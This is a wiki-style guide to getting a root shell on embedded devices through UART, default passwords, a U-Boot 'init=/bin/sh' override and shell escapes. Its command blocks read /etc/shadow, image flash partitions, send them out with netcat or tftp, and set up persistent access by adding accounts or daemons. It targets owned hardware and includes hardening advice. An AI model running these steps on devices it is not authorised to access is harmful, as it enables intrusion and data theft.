# Getting a Shell

A shell on the target turns a static teardown into a live system you can explore, read firmware from, and test against. This page collects the routes to interactive access and what to do once you have it. It assumes you have found a [serial console](../protocols/uart.md) or a [bootloader prompt](bootloader-access.md); those pages cover getting that far.

## The routes, easiest first

1. **Open root shell on UART.** The boot log simply ends at a `#` prompt. You are root with no further work. Rare but it happens, especially on development or cost-reduced hardware.
2. **UART login with known or recovered credentials.** A login prompt that accepts defaults, or a password you cracked from the [firmware dump](firmware-analysis.md#cracking-password-hashes).
3. **Bootloader to shell via `init=`.** [Interrupt U-Boot](bootloader-access.md) and set `bootargs` to `init=/bin/sh`, booting directly to root.
4. **Restricted shell escape.** You get a limited menu or a jailed shell and break out. See [Escaping Restricted Shells](restricted-shell-escape.md).
5. **Network service.** A telnet/SSH service, sometimes enabled by an undocumented request or a config change you make from the bootloader.

## Default and recovered credentials

Before anything clever, try the obvious:

- Vendor defaults for the product line (documented or community-known).
- Common pairs: `root`/`root`, `admin`/`admin`, `root` with an empty password.
- Credentials recovered from the firmware: plaintext passwords in config files, or cracked `shadow` hashes. Firmware analysis is often the key that opens the login you are staring at. See [Firmware Analysis](firmware-analysis.md).

## Forcing a shell from the bootloader

The most reliable route when the OS login is locked. From the [U-Boot prompt](bootloader-access.md):

```
# boot straight to a shell this one time (not persisted)
setenv bootargs "${bootargs} init=/bin/sh"
boot
```

If `/bin/sh` does not exist, try `/bin/ash`, `/bin/bash`, or `rdinit=/bin/sh` for initramfs systems. The boot log's references to the shell binary tell you which to use.

## First things to do with a shell

Once you have a prompt, work quickly and deliberately:

```bash
id ; uname -a                     # who am I, what kernel/arch
cat /proc/mtd                     # flash partition map
mount                             # what is mounted where
cat /etc/passwd /etc/shadow       # accounts and hashes
busybox                           # what applets are available
ps ; netstat -tlnp 2>/dev/null    # running processes and listeners
```

### Pull the firmware from inside

A shell is the cleanest extraction path. Read each flash partition with ECC already applied and move it off the device:

```bash
# NAND: clean read, OOB stripped
nanddump -o -f /tmp/mtd3.bin /dev/mtd3
# or through the block layer
dd if=/dev/mtdblock3 of=/tmp/mtd3.bin
# eMMC: image the whole device
dd if=/dev/mmcblk0 of=/tmp/emmc.img bs=4M
```

Then exfiltrate. Options depend on what the device has:

```bash
# over the network to a listener on your host (nc)
cat /tmp/mtd3.bin | nc 192.168.1.10 4444      # host: nc -l -p 4444 > mtd3.bin
# tftp to your server
tftp -p -l /tmp/mtd3.bin 192.168.1.10
# to a mounted USB stick or SD card
cp /tmp/mtd3.bin /mnt/usb/
```

See [Firmware Extraction](firmware-extraction.md) for the full menu.

### Make access persistent (on your own device)

For ongoing testing of hardware you own, you may want durable access rather than re-glitching U-Boot every boot:

- Enable the device's own telnet/SSH daemon if present, or drop a static `dropbear`/`telnetd` built for the [architecture](../fundamentals/architectures.md).
- Add or change an account in `/etc/passwd` and `/etc/shadow` (requires a writable root filesystem or a writable overlay).
- Note that persisting changes means writing to flash; keep a backup image so you can restore the original.

## When RX works but you still cannot log in

- The console may be **output-only** by design. Pivot to the [bootloader](bootloader-access.md) or a [firmware dump](spi-flash-dump.md).
- Login may be gated by a check you can defeat only by [analyzing the firmware](firmware-analysis.md) or editing the filesystem on the flash.
- A [restricted shell](restricted-shell-escape.md) may be masquerading as a dead console; try its menu commands.

## Defender's view

A production device should not expose a root shell over UART, accept default credentials, or allow `init=/bin/sh` from an unlocked bootloader. Lock the bootloader, disable the console shell, and store no plaintext credentials in firmware.
